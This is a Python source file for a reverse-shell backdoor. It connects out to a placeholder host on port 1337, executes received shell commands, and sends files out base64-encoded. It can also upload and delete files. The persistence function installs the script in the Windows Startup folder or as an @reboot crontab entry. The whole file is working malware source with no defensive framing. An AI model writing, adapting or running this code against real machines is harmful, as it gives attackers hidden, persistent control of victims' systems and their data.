import socket
import json
import subprocess
import os
import base64
import sys
import shutil

class Backdoor:
	def __init__(self, target, port):
		self.port = port
		self.target = target
		self.connection = None

	def connect(self):
		while True:
			try:
				self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.connection.connect((self.target, self.port))
				print("[+] Connected to the target.")
				break
			except ConnectionRefusedError:
				print("[-] Connection refused. Make sure the server is running.")
				self.reconnect()
			except Exception as e:
				print(f"[-] Connection failed: {e}")
				self.reconnect()

	def reconnect(self):
		self.connection.close()
		self.connection = None
		self.connect()

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = b""
		while True:
			try:
				received_data = self.connection.recv(1024)
				if not received_data:
					break
				json_data += received_data
				return json.loads(json_data.decode())
			except ValueError:
				return "[-] Error during command execution."

	def execute_system_command(self, command):
		try:
			result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			return result.decode()
		except subprocess.CalledProcessError as e:
			return str(e.stderr.decode())

	def change_directory(self, path):
		try:
			os.chdir(path)
			return "[+] Changing working directory to " + os.getcwd()
		except:
			return "[-] Directory not found: " + path

	def read_file(self, path):
		if os.path.isfile(path):
			with open(path, "rb") as f:
				return base64.b64encode(f.read()).decode()
		else:
			return f"[-] {path} not found"

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
		return "[+] Upload successful."

	def remove(self, path):
		if os.path.exists(path):
			os.system(f'del -Force {path}' if os.name == 'nt' else f'rm -rf {path}')
			return f"[+] {path} deleted"
		else:
			return f"[-] {path} not found"

	def run(self):
		self.connect()
		while True:
			command = str(self.reliable_receive())
			command = command.split()
			try:
				if command[0] == "exit":
					print("exit")
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_directory(command[1])
				elif command[0] == "rm" and len(command) > 1:
					command_result = self.remove(command[1])
				elif command[0] == "ls":
					command_result = subprocess.check_output('dir' if os.name == 'nt' else 'ls -la', shell=True, text=True)
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], " ".join(command[2:]))
				else:
					command_result = self.execute_system_command(command)
			except Exception:
				command_result = "[-] Error during command execution."

			print(command_result)
			self.reliable_send(command_result)

### only for Windows, Unix inc soon ###
def persistence():
	if os.name == 'nt':
		script_path = "C:\\Users\\$PATH\\get_shell.py"
		startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
		startup_file = os.path.join(startup_dir, "get_shell.pyw")

		if not os.path.isfile(startup_file) or os.stat(script_path).st_mtime > os.stat(startup_file).st_mtime:
			# copy get_shell script to the startup directory
			shutil.copyfile(script_path, startup_file)
	else:
		script_path = os.path.abspath('get_shell.py')
		if os.path.exists(script_path):
			cron_line = "@reboot python3 {}\n".format(script_path)
		else:
			return
		# The subprocess.run() function is used to run the given command.
		result = subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
		current_crontab = result.stdout.decode()
		
		if cron_line not in current_crontab:
			# Adds the task to the crontab, if it's not already there.
			with open("mycron", "a") as cron_file:
				cron_file.write(cron_line)
			subprocess.run(['crontab', 'mycron'])
			os.remove("mycron")




def main():
	target = "HOST"
	port = 1337
	my_backdoor = Backdoor(target, port)
	persistence()
	my_backdoor.run()

if __name__ == "__main__":
	main()
